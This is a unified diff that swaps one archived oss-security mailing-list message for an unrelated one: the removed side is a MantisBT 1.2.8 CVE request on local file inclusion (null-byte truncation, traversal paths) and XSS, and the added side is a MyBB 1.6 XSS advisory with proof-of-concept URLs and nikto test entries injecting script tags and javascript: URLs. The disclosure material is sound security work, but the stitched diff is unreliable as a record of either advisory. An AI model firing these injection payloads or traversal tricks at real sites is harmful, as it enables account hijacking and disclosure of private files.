@@ -1,121 +1,105 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/09/04/1
-Message-ID: <1315113527.9806.54@d.hx.id.au>
-Date: Sun, 04 Sep 2011 15:18:43 +1000
-From: David Hicks <d@...id.au>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/7
+Message-ID: <AANLkTim6g4-8hbtUewtY-=yOKt9H=X79KeCpE_OvDEEa@mail.gmail.com>
+Date: Fri, 18 Mar 2011 14:17:35 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Cc: calderon@...sec.mx, advisory@...ridge.ch, developer discussions <mantisbt-dev@...ts.sourceforge.net>
-Subject: CVE requests: <mantisbt-1.2.8 multiple vulnerabilities (1xLFI+XSS, 2xXSS)
+Subject: CVE Request: MyBB 1.6 <= Cross Site Scripting Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Request #1: XSS injection via PHP_SELF
+1. OVERVIEW
 
-Paulino Calderon from Websec reported an issue [2] against MantisBT
-1.2.6 whereby an attacker could craft URLs such that arbitrary HTML
-could be inserted into page output. Users running MantisBT on a vanilla
-nginx installation are unaffected because nginx will check to see
-whether the full URL path exists and is valid (with an XSS injection
-string, it won't be). Other web servers such as Apache won't perform
-these stringent checks and are therefore MantisBT is vulnerable to this
-attack when running on an Apache server. This attack does not require
-users to be authenticated or logged into a MantisBT installation to be
-impacted by this vulnerability.
-
-The same issue was identified by High-Tech Bridge Security Research Lab
-with their advisory #HTB23045 available at [1]. Paul Richards (MantisBT
-developer) also discovered this issue during a routine audit.
-
-MantisBT bug reports with full details (including patches) are available
-at [2] and [3].
+MyBB was vulnerable to Cross Site Scripting.
 
 
+2. APPLICATION DESCRIPTION
+
+MyBB is a free bulletin board system software package developed by the
+MyBB Group.
+It's supposed to be developed from XMB and DevBB bulletin board applications.
 
 
-Request #2: LFI and XSS via bug_actiongroup_ext_page.php
+3. VULNERABILITY DESCRIPTION
 
-High-Tech Bridge Security Research Lab reported an issue against
-MantisBT 1.2.7 whereby an attacker could include local system files via
-a directory traversal/local file inclusion vulnerability in
-bug_actiongroup_ext_page.php.
-
-Web server and/or PHP and/or operating system configuration will dictate
-whether this vulnerability can be exploited. MantisBT will prepend
-"bug_actiongroup_" prior to the attacker-supplied path. A suffix is
-appended, but can be stripped off using a null character (%00). Some
-environments (at least nginx and php-fpm 5.3) do not allow directory
-traversal from a file or invalid path/file. Other environments do allow
-directory traversal from file names (even invalid ones), for instance:
-"bug_actiongroup_page.php/../private_file" or
-"bug_actiongroup_/../private_file".
-
-This vulnerability can also allow an attacker to perform an XSS attack
-(no login/session required with the MantisBT attacker) if PHP is
-configured to display error messages. The error message from the
-require_once() call is not sanitised by PHP prior to displaying it to
-the user. Best (and therefore common) practice is to not display PHP
-error messages to the end user, severely limiting the applicability of
-this attack.
-
-Full details and patches are available at [3].
+Two XSS vulnerabilities were found. One is user-driven XSS on "url" parameter.
+User will get xssed upon successful log-in.
+The other is a reflected XSS on "posthash" parameter where the valid
+tid (topic id) is required for successful attack.
+The anti-CSRF check against "my_post_key" parameter was not done in
+thread/post preview mode and thus there came a way for XSS to be
+successful.
 
 
+4. VERSIONS AFFECTED
+
+MyBB 1.6 and lower
 
 
-Request #3: XSS issues with unescaped os, os_build and platform
-parameters on bug_report_page.php and bug_update_advanced_page.php
+5. PROOF-OF-CONCEPT/EXPLOIT
 
-High-Tech Bridge Security Research Lab reported an issue against
-MantisBT 1.2.7 whereby an attacker could perform an XSS attack on users
-with access to either bug_report_page.php or
-bug_update_advanced_page.php. In default and typical MantisBT
-installations, this is limited to users that are currently logged in.
+User-driven XSS
+http://attacker.in/mybb/member.php?action=login&url=javascript:alert%28/XSS/%29
 
-The cause of this problem is with the use of the ancient Projax library
-(available at [4]) in the 1.2.x branch of MantisBT. Projax does not
-escape value attributes when printing input form elements. In some
-respects, this issue is also a bug with Projax however it may be a case
-that users of this library are expected to provide values that are
-already sanitised. MantisBT 1.3.x (master branch) uses jQuery instead of
-Projax and is therefore not impacted by this vulnerability.
+Reflected XSS
+http://attacker.in/mybb/newreply.php?my_post_key=&subject=XSS&action=do_newreply&posthash="><script>alert(/XSS/)</script>&quoted_ids=&lastpid=1&from_page=1&tid=1&method=quickreply&message=test&previewpost=Preview
+Post
 
-Full details and patches are available at [3].
+Or try nikto udb_tests
 
+"400003","0","4","/member.php?action=login&url=javascript:alert(/XSS/)","GET","<input
+type=\"hidden\" name=\"url\" value=\"javascript:alert(/XSS/)\"
+/>","","","<input type="hidden" name="url" value=\"\" />","","MyBB 1.6
+<= Cross Site Scripting,  ref:
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting","",""
 
-
-
-Additional information:
-
-A new release (mantisbt-1.2.8) is being put together and will be
-available shortly to download from mantisbt.org to resolve these 3
-vulnerabilities. Announcements will be made to
-mantisbt-announce@...ts.sourceforge.net, mantisbt.org/blog, #mantishelp
-on irc.freenode.net and other usual channels. Major Linux distributions
-shipping mantisbt-1.2.x will also be informed.
-
-With thanks to: Paulino Calderon (Websec), High-Tech Bridge Security
-Research Lab, Paul Richards (MantisBT)
+"400004","0","4","/newreply.php?my_post_key=&subject=XSS&action=do_newreply&posthash=\"><script>alert(/XSS/)</script>&quoted_ids=&lastpid=1&from_page=1&tid=1&method=quickreply&message=test&previewpost=Preview
+Post","GET","<input type="hidden" name="posthash"
+value=""><script>alert(/XSS/)</script>" />","","","<input
+type="hidden" name="url" value=\"\" />","","MyBB 1.6 <= Cross Site
+Scripting,  ref:
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting","",""
 
 
+6. SOLUTION
+
+Upgrade to 1.6.1
 
 
-References:
+7. VENDOR
 
-[1]
-https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_mantisbt.html
-
-[2] http://www.mantisbt.org/bugs/view.php?id=13191
-
-[3] http://www.mantisbt.org/bugs/view.php?id=13281
-
-[4] http://www.ngcoders.com/projax/
+MyBB Development Team
+http://www.mybb.com/
 
 
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
 
 
-Thanks,
+9. DISCLOSURE TIME-LINE
 
-David Hicks
-MantisBT Developer
-mantisbt.org, #mantishelp irc.freenode.net
+2010-12-09: notified vendor
+2010-12-15: vendor released fixed version
+2010-12-20: vulnerability disclosed
 
-Download attachment "signature.asc" of type "application/pgp-signature" (837 bytes)
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting
+Vendor ChangeLog:
+http://blog.mybb.com/2010/12/15/mybb-1-6-1-release-1-4-14-update/
+About MyBB: http://www.mybb.com/about/mybb
+
+
+#yehg [2010-12-20]
+
+#last updated at 2010-12-23
+---------------------------------
+Best regards,
+YGN Ethical Hacker Group
+Yangon, Myanmar
+http://yehg.net
+Our Lab | http://yehg.net/lab
+Our Directory | http://yehg.net/hwd
